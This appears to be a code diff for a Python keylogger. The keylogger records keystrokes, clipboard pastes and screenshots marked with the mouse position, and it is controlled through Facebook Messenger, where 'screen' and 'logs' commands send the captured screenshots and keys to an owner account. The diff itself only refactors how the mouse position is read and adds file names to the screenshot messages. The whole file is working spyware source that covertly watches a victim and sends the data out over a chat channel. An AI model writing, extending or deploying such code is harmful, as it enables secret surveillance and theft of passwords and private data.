@@ -24,7 +24,7 @@ class FacebookController(fbchat.Client):
             self.keylogger.toggle_screenshots_capturing()
         if message == 'screen':
             for screenshot in self.keylogger.get_saved_screenshots():
-                self.sendLocalImage(self.owner_uid, message='to widzialem', image=screenshot)
+                self.sendLocalImage(self.owner_uid, message='to widzialem: {}'.format(screenshot), image=screenshot)
             self.keylogger.reset_screenshot_directory()
         if message == 'logs':
             self.send_to_owner(''.join(self.keylogger.flush_captured_keys()))
@@ -72,7 +72,8 @@ class Keylogger(object):
 
     def _on_left_mouse_button_click(self, *args, **kwargs):
         if self.capture_screenshots_on_click:
-            screenshot = self._mark_mouse_position(pyscreenshot.grab())
+            mouse_x, mouse_y = pymouse.PyMouse().position()
+            screenshot = self._mark_mouse_position(pyscreenshot.grab(), mouse_x, mouse_y)
             screenshot.save('/tmp/screen{}.jpg'.format(self.screenshot_counter))
             self.screenshot_counter += 1
 
@@ -83,8 +84,7 @@ class Keylogger(object):
                 self.previous_clipboard_content = clipboard_content
                 self.captured_pasting.append(clipboard_content)
 
-    def _mark_mouse_position(self, screenshot):
-        mouse_x, mouse_y = pymouse.PyMouse().position()
+    def _mark_mouse_position(self, screenshot, mouse_x, mouse_y):
         ImageDraw.Draw(screenshot).ellipse([mouse_x - 10, mouse_y - 10, mouse_x + 10, mouse_y + 10], fill=(0, 0, 255))
 
         return screenshot
